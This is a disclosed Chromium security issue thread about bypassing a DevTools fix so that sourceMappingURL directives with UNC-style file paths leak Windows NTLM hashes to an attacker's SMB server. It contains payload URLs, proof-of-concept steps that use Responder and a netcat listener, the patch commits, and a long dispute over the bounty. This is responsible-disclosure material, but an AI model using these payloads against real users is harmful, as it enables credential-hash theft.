# Security: Bypass 1342722, sourceMappingURL directive allows use of UNC paths on Windows

| Field | Value |
|-------|-------|
| **Issue ID** | [40061586](https://issues.chromium.org/issues/40061586) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Unknown |
| **Platforms** | Windows |
| **Reporter** | ha...@gmail.com |
| **Assignee** | ja...@chromium.org |
| **Created** | 2022-11-03 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

Bypass <https://bugs.chromium.org/p/chromium/issues/detail?id=1342722> using this URL:

sourceMappingURL=file:///\192.168.1.111/test

Leak hashes.

**VERSION**  

Chrome Version: 107.0.5304.88 (Official Build) (64-bit) (cohort: Stable)  

Operating System: Windows 10 Version 21H2 (Build 19044.2130)

**REPRODUCTION CASE**

1. Repeat <https://bugs.chromium.org/p/chromium/issues/detail?id=1342722>, but using this index.js file.

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

Reporter credit: Axel Chong

## Attachments

- deleted (application/octet-stream, 0 B)
- [index.js](attachments/index.js) (text/plain, 97 B)
- [index.html](attachments/index.html) (text/plain, 209 B)
- [Untitled_ Nov 4, 2022 4_09 AM.webm](attachments/Untitled_ Nov 4, 2022 4_09 AM.webm) (video/webm, 2.7 MB)
- [secondary.html](attachments/secondary.html) (text/plain, 149 B)

## Timeline

### ha...@gmail.com (2022-11-03)

reattaching corrected index.js

### [Deleted User] (2022-11-03)

[Empty comment from Monorail migration]

### ha...@gmail.com (2022-11-03)

Reposting steps from original report for brevity:

### PoC
1. Create an HTTP server
2. Create a SMB server with Responder.py (i.e. `sudo ./Responder.py -w -I <network_interface_name>`). Responder.py can be downloaded from https://github.com/SpiderLabs/Responder
3. Host the two files attached to this report and called `index.html` and `index.js` (NOTE: Use the new one attached to this report) after replacing `<smb_responder_ip>` with the IP address of the SMB server responder created at point 2 in `index.js`
4. Visit the hosted index.html and open the dev tools
5. Notice in Responder that a new SMB request has been received with the NetNTLMv2 hashes of the victim

Also adding in the original index.html file

### ha...@gmail.com (2022-11-03)

added a video

explanation of what happens in video:
setup a responder, check chrome version, refresh the page to load the sourcemap, the chrome browser performs the smb request. The hash is previously captured (note that it says skipping hashes for User, the reason being is I already captured it before and it is cached).

### ha...@gmail.com (2022-11-04)

Clarification of the video of https://crbug.com/chromium/1381217#c4 it says the hash is previously captured, but thats because its sending the hashes to my malicious server and I already previously captured it (while testing my PoC) so Responder has alreafy stored it on a file, wont show it again. Additionally it would be a security issue to show my hashes on screen.

### ha...@gmail.com (2022-11-07)

Alternatively, for a simpler PoC,  if you do not want to use Responder, you can also test that loading the source map will result in a SMB request being made to the server, (albeit you do not see the hash capture in action if you do not use Responder).

What you can do is to replace <smb_responder_ip> with your attacker server IP address. On your attacker server, run nc -nvlp 445 (default port for SMB). When you load the HTML and Inspect Element on your windows computer, you should see that you receive an SMB request on your attacker server similar to below:

┌──(kali㉿kali)-[~]
└─$ nc -vnlp 445
listening on [any] 445 ...
connect to [192.168.1.115] from (UNKNOWN) [192.168.1.83] 52576
E�SMBr▒S�����"NT LM 0.12SMB 2.002SMB 2.???

This should not occur as https://bugs.chromium.org/p/chromium/issues/detail?id=1342722 blocked loading SMB requests in source map. When an SMB request occurs, Windows will send the NTLM hashes to the attacker server.

If you want to see the hash-capture in action then you must use Responder as per the steps in https://crbug.com/chromium/1381217#c3

### ha...@gmail.com (2022-11-07)

As for the reason why the fix is insufficient, we can see that in line 255 https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/3784603/7/front_end/core/host/ResourceLoader.ts,

if (!allowFileUNCPaths && url.startsWith('file:////')) {

We are just checking if the URL starts with file:////, but over here it starts with file:///\ and it still sends the SMB request. As for the suggested fix, ideally the check should be more rigorous using a regex-based approach. Alternatively, for another possible fix, I was playing around with the new URL object in v8, entering 

new URL("file:///\\example.com")

will result in

{origin: 'file://', protocol: 'file:', username: '', password: '', host: 'example.com', …}

You can see that the URL object is able to detect the hostname of the file:// protocol. So another possible fix would to use the URL object in the Typescript file to parse the source map URL first and check if the host is empty (and fetch the source map URL if it is)

### ke...@chromium.org (2022-11-08)

Thanks for the report.

jarin@: PTAL?

Setting flags based on discussions on https://crbug.com/chromium/1342722.

[Monorail components: Platform>DevTools>JavaScript]

### [Deleted User] (2022-11-08)

[Empty comment from Monorail migration]

### ha...@gmail.com (2022-11-08)

Hi, I feel that https://bugs.chromium.org/u/szuend@chromium.org should also be added to this report, as they did the fix for https://chromium.googlesource.com/devtools/devtools-frontend/+/cac73333ada165be3c10fec00626968753155e3b

### [Deleted User] (2022-11-08)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bm...@chromium.org (2022-11-09)

[Empty comment from Monorail migration]

### ja...@google.com (2022-11-09)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-11-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/devtools/devtools-frontend/+/974ad8844b4b83b9a08a9ec4d7c19131cee93ca3

commit 974ad8844b4b83b9a08a9ec4d7c19131cee93ca3
Author: Jaroslav Sevcik <jarin@google.com>
Date: Wed Nov 09 10:07:08 2022

Prevent host bindings from loading resources from remote files

This extends the existing ad-hoc UNC blocking to all remote files.
Instead of trying to match the URL prefix, we now use the built-in URL
parser to figure out if a URL is a remote file.

The patch also changes the user visible strings to say that we are
preventing access to remote files for security reasons.

Bug: chromium:1381217
Change-Id: I73eb4d95113585b67b6e2af432942f72db364310
Reviewed-on: https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/4013140
Reviewed-by: Simon Zünd <szuend@chromium.org>
Commit-Queue: Jaroslav Sevcik <jarin@chromium.org>

[modify] https://crrev.com/974ad8844b4b83b9a08a9ec4d7c19131cee93ca3/front_end/core/i18n/locales/en-US.json
[modify] https://crrev.com/974ad8844b4b83b9a08a9ec4d7c19131cee93ca3/test/unittests/front_end/core/sdk/PageResourceLoader_test.ts
[modify] https://crrev.com/974ad8844b4b83b9a08a9ec4d7c19131cee93ca3/front_end/core/sdk/NetworkManager.ts
[modify] https://crrev.com/974ad8844b4b83b9a08a9ec4d7c19131cee93ca3/test/unittests/front_end/helpers/EnvironmentHelpers.ts
[modify] https://crrev.com/974ad8844b4b83b9a08a9ec4d7c19131cee93ca3/front_end/panels/timeline/TimelineLoader.ts
[modify] https://crrev.com/974ad8844b4b83b9a08a9ec4d7c19131cee93ca3/front_end/core/i18n/locales/en-XL.json
[modify] https://crrev.com/974ad8844b4b83b9a08a9ec4d7c19131cee93ca3/front_end/core/sdk/sdk-meta.ts
[modify] https://crrev.com/974ad8844b4b83b9a08a9ec4d7c19131cee93ca3/front_end/core/host/ResourceLoader.ts


### ja...@chromium.org (2022-11-11)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-11)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-11)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-11)

This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M108. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-11-11)

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), harrysouders (iOS), obenedict (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2022-11-11)

M108 merge approved, please merge this fix to branch 5359 by 12pm PT, Monday, 14 November so this fix can be included in the M108 Stable cut -- thank you! 

### gi...@appspot.gserviceaccount.com (2022-11-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/devtools/devtools-frontend/+/1223b5bb140c470b66f6f0a73de6064a643878f4

commit 1223b5bb140c470b66f6f0a73de6064a643878f4
Author: Jaroslav Sevcik <jarin@google.com>
Date: Wed Nov 09 10:07:08 2022

Prevent host bindings from loading resources from remote files

This extends the existing ad-hoc UNC blocking to all remote files.
Instead of trying to match the URL prefix, we now use the built-in URL
parser to figure out if a URL is a remote file.

The patch also changes the user visible strings to say that we are
preventing access to remote files for security reasons.

Bug: chromium:1381217
Change-Id: I73eb4d95113585b67b6e2af432942f72db364310
Reviewed-on: https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/4013140
Reviewed-by: Simon Zünd <szuend@chromium.org>
Commit-Queue: Jaroslav Sevcik <jarin@chromium.org>
(cherry picked from commit 974ad8844b4b83b9a08a9ec4d7c19131cee93ca3)
Reviewed-on: https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/4020514
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>

[modify] https://crrev.com/1223b5bb140c470b66f6f0a73de6064a643878f4/front_end/core/i18n/locales/en-US.json
[modify] https://crrev.com/1223b5bb140c470b66f6f0a73de6064a643878f4/test/unittests/front_end/core/sdk/PageResourceLoader_test.ts
[modify] https://crrev.com/1223b5bb140c470b66f6f0a73de6064a643878f4/test/unittests/front_end/helpers/EnvironmentHelpers.ts
[modify] https://crrev.com/1223b5bb140c470b66f6f0a73de6064a643878f4/front_end/core/sdk/NetworkManager.ts
[modify] https://crrev.com/1223b5bb140c470b66f6f0a73de6064a643878f4/front_end/panels/timeline/TimelineLoader.ts
[modify] https://crrev.com/1223b5bb140c470b66f6f0a73de6064a643878f4/front_end/core/i18n/locales/en-XL.json
[modify] https://crrev.com/1223b5bb140c470b66f6f0a73de6064a643878f4/front_end/core/sdk/sdk-meta.ts
[modify] https://crrev.com/1223b5bb140c470b66f6f0a73de6064a643878f4/front_end/core/host/ResourceLoader.ts


### am...@google.com (2022-11-17)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-11-18)

Congratulations, Axel! The VRP Panel has decided to award you $5,000 for this report. Thank you for your efforts and reporting this issue to us! 

### ha...@gmail.com (2022-11-18)

Thanks for the reward :)! A question I wanted to ask, the report I bypassed with the exact same impact received 7500. Was the difference due to report quality? I am not sure why my report would be of lower quality though, as I did clearly reference the original bug and also provided explanation on why the fix was faulty and how to fix it in https://crbug.com/chromium/1381217#c7 which was eventually used in https://crbug.com/chromium/1381217#c14.

### am...@chromium.org (2022-11-18)

Hi and thank you for your question. While you report clearly points out a security regression (which we greatly appreciate!) however, upon review of your issue and the previously reported issue, the details of your report were the exact same as the previously reported issue, including an identical POC and steps to reproduce. 

### ha...@gmail.com (2022-11-18)

Thanks for the information :). But it wasn't a regression, but a bypass (see https://crbug.com/chromium/1381217#c1) which uses the different payload. I am also not sure why restating details and the PoC would lower the report quality any further though as it seemed more practical to do so (given that this is a bypass, do I really need to modify the HTML in the PoC?). And I also did offer less complex steps https://crbug.com/chromium/1381217#c6 in case the triager didn't want to download Responder.

### ha...@gmail.com (2022-11-18)

I guess what I am trying to say is I feel that "reusing details and PoC" (again it seemed practical to do so, as it wouldn't make sense to change a PoC and reproduction steps when they are already fine) feels like a minor nitpick compared to what else was offered in this report such as the simpler reproduction in https://crbug.com/chromium/1381217#c6 and the root cause analysis + suggested way of fixing offered https://crbug.com/chromium/1381217#c7.

Hope I am not bothering too much with these questions.

### am...@chromium.org (2022-11-18)

No, it's always good to ask questions. To clarify, it is considered a security regression if the issue was not fully patched and can be exploited via the same poc and repro steps as provided a previous report. As in we introduced a patch that either resulted in a new security issue or did not fully mitigate the original vector. Not to nitpick either, while your suggestion in c#7 was much appreciated, the fix was already being worked at the time and was landed the next day. 
Reward amounts across VRP reports, even for the same type of (or in is case same) bug, they are not any sort of official precedent. 

The VRP Panel reviewed both reports in depth and it was determined that the reward amount was fair for this report. If you would like a more specific reassessment, we are happy to reconsider and the next session (week after next), there is - of course- no guarantee that the reward amount will change. 

### ha...@gmail.com (2022-11-18)

Thanks for your explanation in https://crbug.com/chromium/1381217#c28. I appreciate it :). To be clear, https://crbug.com/chromium/1381217#c7 was made before the sheriff assigned the report. So I am not sure how it could be worked on before. 

Before I decide whether or not to send this for VRP re-review, is https://crbug.com/chromium/1381217#c25 the reason why this report had a reduced amount? I think that is a mistake as the PoC is also slightly different (the attached index.js in https://crbug.com/chromium/1381217#c1 uses file:///\ instead of file:////), the PoC was similar but the key part of the PoC being the sourceMappingUrl was not exactly identical. 

### am...@chromium.org (2022-11-19)

>>>To be clear, https://crbug.com/chromium/1381217#c7 was made before the sheriff assigned the report. So I am not sure how it could be worked on before. 
Apologies, you're correct here. I was looking at the timestamps of the CLs and just noticed the time delta was quite tight. 

>>>Before I decide whether or not to send this for VRP re-review, is https://crbug.com/chromium/1381217#c25 the reason why this report had a reduced amount? I think that is a mistake as the PoC is also slightly different (the attached index.js in https://crbug.com/chromium/1381217#c1 uses file:///\ instead of file:////), the PoC was similar but the key part of the PoC being the sourceMappingUrl was not exactly identical.

I think I should clarify something. You did not receive a "reduced amount". VRP reward decisions are made on individual basis, based on the reward matrix [1] which merges bug class, impact, and report quality into a single decision point. As mentioned in https://crbug.com/chromium/1381217#c28, the reward amount for another report is not official precedent.
In reviewing your report we experienced a certain familiarity and confirmed a specific information being re-used from the previous report. We thus made the reward decision, as always, using the combination of report quality + bug class:impact. 

Please let me know if you would like this issue reassessed. There will not be a VRP Panel session next week, so the next time we would discuss this issue would be the following week and any update would be just added/commented here. 



### am...@chromium.org (2022-11-19)

for got to add [1] https://g.co/chrome/vrp reference 

### ha...@gmail.com (2022-11-19)

Thanks, what I meant to say if "In reviewing your report we experienced a certain familiarity and confirmed a specific information being re-used from the previous report" affected (not reduce) the assessment of the report quality and therefore the reward in any way. 

If so I disagree with this having an effect on the report quality as I had already made clear I was referencing the original report earlier.

### am...@google.com (2022-11-19)

[Empty comment from Monorail migration]

### ha...@gmail.com (2022-11-20)

Firstly, I would like to apologise for using the word "nitpick" in https://crbug.com/chromium/1381217#c27, at that time I was feeling a bit frustrated, but I think anyone else in my shoes would have felt the same way.

Secondly, I have decided that this report should be sent for rereview:

In the review, please consider the following points:

1) "In reviewing your report we experienced a certain familiarity and confirmed a specific information being re-used from the previous report"

When I write a report, my target audience is always the sheriffs and developers who will handle the report, and that includes easier ways to reproduce the issue in https://crbug.com/chromium/1381217#c6 and a possible way of fixing in https://crbug.com/chromium/1381217#c7 which I spent additional effort to think of. If I find that quoting another report would be more helpful, then I don't see a reason why I shouldn't. You can see in https://crbug.com/chromium/1381217#c3 that I mentioned that I was "reposting the original steps for brevity" and I did not even try to hide this fact, so there was nothing to even "confirm" in the first place. That was why I was surprised when you mentioned this as a reason in https://crbug.com/chromium/1381217#c25. It is unfair to have this negatively affect the perception of the report.
 
2) The suggested way of fixing made in https://crbug.com/chromium/1381217#c7

In https://crbug.com/chromium/1381217#c7, I pointed out the root cause of why the fix is unsafe, as well as suggested a more robust way of fixing, which was eventually done in https://crbug.com/chromium/1381217#c14. I felt that this way of fixing was more robust, as using the already built-in URL parser is more accurate to any regex-based, string based approach. Just recently, I just discovered a secondary PoC which can be used to bypass the original fix (You should add this to your test case as well.), 

sourceMappingUrl=file://<smb-request-ip>//test/e

You can retest this by hosting the secondary.html I made on another server. Visiting it and open up inspector, which will cause a SMB request to be made to this server.

This secondary PoC was fixed by using the built-in URL parser, which was the suggestion I made in https://crbug.com/chromium/1381217#c7. While I cannot absolutely say this for sure, it is likely that if not for the suggested way of fixing I made, the fix that would have occurred otherwise would have probably caused another security regression using this secondary PoC and would have left users vulnerable to the same attack, so I hope you would consider this point (even if hypothetical) too.



### ha...@gmail.com (2022-11-20)

Forgot to add that for 2), testing for secondary.html should be done on version <= 107, as the fix will be rolled out in 108.

While I know that the VRP panel puts a lot of value in the PoC, I hope they also consider any fix/assistance equally important as well. :)

### ha...@gmail.com (2022-11-20)

I forgot to add a 3rd point too,

3) What wasn't mentioned in the previous report is that DevTools can be opened by pressing F12, so anyone (not just developers) can be a target to this attack if I just get them to press F12.

### ha...@gmail.com (2022-11-21)

Just to be clear for https://crbug.com/chromium/1381217#c34, I wasn't frustrated by the amount. I was frustrated by the reasoning given, which I felt was unjustified.

### am...@chromium.org (2022-11-28)

[Empty comment from Monorail migration]

### pg...@google.com (2022-11-29)

[Empty comment from Monorail migration]

### pg...@google.com (2022-11-29)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-12-02)

Hello Axel, thank you again for this report and taking the time to explain your point of view. We have re-evaluated this issue - including your comments following the original reward decision- and have decided the the reward is appropriate for this bug and report. Sometimes we do make mistakes with reward amounts. In review, it was decided - if anything - that we may have possibly over-rewarded the original report given the bug class and impact. 

### ha...@gmail.com (2022-12-02)

Thank you for the clarification! A case of overrewarding the original report seems to make the most sense to me. As the web-share UNC report was rewarded less than that (and the same as this).

Happy holidays, and I hope to be able to submit more bugs in the new year.



### [Deleted User] (2023-02-17)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1381217?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40061586)*
